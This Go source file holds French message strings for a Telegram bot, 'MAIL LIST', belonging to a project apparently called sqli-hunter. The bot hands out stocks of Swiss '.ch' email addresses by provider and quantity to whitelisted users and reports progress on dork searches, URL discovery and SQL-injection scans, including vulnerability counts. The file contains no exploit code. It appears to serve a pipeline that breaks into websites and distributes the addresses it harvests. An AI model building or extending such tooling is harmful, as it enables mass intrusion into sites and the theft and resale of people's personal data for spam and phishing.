package bot

import (
	"fmt"
	"strings"

	"github.com/sqli-hunter/sqli-hunter/internal/results"
)

const nameFR = "MAIL LIST"

var fr = Texts{
	BotName: nameFR,

	Welcome:       frWelcome,
	StockEmpty:    frStockEmpty,
	StockHeader:   frStockHeader,
	StockLine:     frStockLine,
	StockTotal:    frStockTotal,
	ExtractMenu:   frExtractMenu,
	QuantityAsk:   frQuantityAsk,
	InvalidQty:    frInvalidQty,
	Hint:          frHint,
	Delivery:      frDelivery,
	MaxEmails:     frMaxEmails,
	WriteError:    frWriteError,
	SendError:     frSendError,
	TakeError:     frTakeError,
	AccessDenied:  frAccessDenied,
	MyID:          frMyID,
	BtnExtract:    frBtnExtract,
	BtnBack:       frBtnBack,
	ProviderLabel: frProviderLabel,
	CallbackDenied: frCallbackDenied,
	CallbackEmpty:  frCallbackEmpty,
	Status:         frStatus,
}

func frWelcome(stock string) string {
	return fmt.Sprintf("🇨🇭 *%s*\n_Stock emails .ch — extraction instantanée_\n\n%s", nameFR, stock)
}

func frStockEmpty() string {
	return "📭 *Stock vide*\n\nAucun email dispo pour le moment."
}

func frStockHeader() string {
	return "📊 *Stock disponible*\n_uniques · non livrés_\n\n"
}

func frStockLine(emoji, provider string, count int) string {
	return fmt.Sprintf("%s `%s` — *%d*\n", emoji, provider, count)
}

func frStockTotal(total int) string {
	return fmt.Sprintf("\n━━━━━━━━━━━━━━━━\n🎯 *Total : %d emails*", total)
}

func frExtractMenu() string {
	return "🗂️ *Choisis un fournisseur*\n\n👇 Sélectionne le service :"
}

func frQuantityAsk(emoji, provider string) string {
	return fmt.Sprintf("%s *%s* sélectionné\n\n🔢 Envoie un *chiffre* — combien d'emails ?", emoji, provider)
}

func frInvalidQty(provider string) string {
	return fmt.Sprintf("⚠️ Nombre invalide.\n\nEnvoie un chiffre pour *%s* (ex: `100`)", provider)
}

func frHint() string {
	return "👆 /start — export emails\n📊 /status — progression du daily"
}

func frDelivery(emoji, provider string, count int) string {
	return fmt.Sprintf("✅ *%d emails* livrés\n%s `%s`\n\n🗑️ Retirés du stock", count, emoji, provider)
}

func frMaxEmails(max int) string {
	return fmt.Sprintf("⚠️ Max *%d* emails par requête.", max)
}

func frWriteError() string  { return "❌ Erreur écriture fichier." }
func frSendError(err string) string { return "❌ Envoi échoué: " + err }
func frTakeError(err string) string  { return "❌ " + err }

func frAccessDenied(userID int64) string {
	return fmt.Sprintf("🚫 *Accès refusé*\n\n🆔 Ton ID : `%d`\n\nEnvoie /myid pour l'ajouter à la whitelist.", userID)
}

func frMyID(userID int64) string {
	return fmt.Sprintf("🆔 *Ton ID Telegram*\n\n`%d`\n\n➕ Ajoute-le dans `TELEGRAM_ALLOWED_IDS`", userID)
}

func frBtnExtract() string { return "📥 Extraire" }
func frBtnBack() string    { return "◀️ Retour" }

func frProviderLabel(emoji, provider string, count int) string {
	return fmt.Sprintf("%s %s · %d", emoji, provider, count)
}

func frCallbackDenied() string { return "🚫 Accès refusé" }
func frCallbackEmpty() string  { return "📭 Stock vide" }

func frStatus(scopeN, scannedN int, st results.RunStatus, updatedAgo string) string {
	var b strings.Builder
	b.WriteString("📊 *Progression sqli-hunter*\n")
	if updatedAgo != "" {
		b.WriteString(fmt.Sprintf("_MAJ il y a %s_\n", updatedAgo))
	}
	b.WriteString(fmt.Sprintf("phase: *%s*\n", st.Phase))
	if st.DorkTotal > 0 {
		b.WriteString(fmt.Sprintf("dorks: %d/%d\n", st.DorkIndex, st.DorkTotal))
	} else if st.DiscoverPage > 0 {
		b.WriteString(fmt.Sprintf("page discover: %d\n", st.DiscoverPage))
	}
	if st.URLsKept > 0 || st.URLsFetched > 0 {
		b.WriteString(fmt.Sprintf("discover: %d gardées · %d lues", st.URLsKept, st.URLsFetched))
		if st.URLsSkipped > 0 {
			b.WriteString(fmt.Sprintf(" · %d ignorées", st.URLsSkipped))
		}
		b.WriteString("\n")
	}
	if st.ScanTotal > 0 || st.Scanned > 0 {
		b.WriteString(fmt.Sprintf("scan: %d/%d · %d vuln · %d findings\n",
			st.Scanned, st.ScanTotal, st.Vulns, st.Findings))
	}
	b.WriteString(fmt.Sprintf("scope_daily: *%d* URLs\n", scopeN))
	b.WriteString(fmt.Sprintf("déjà scannées: *%d*", scannedN))
	return b.String()
}
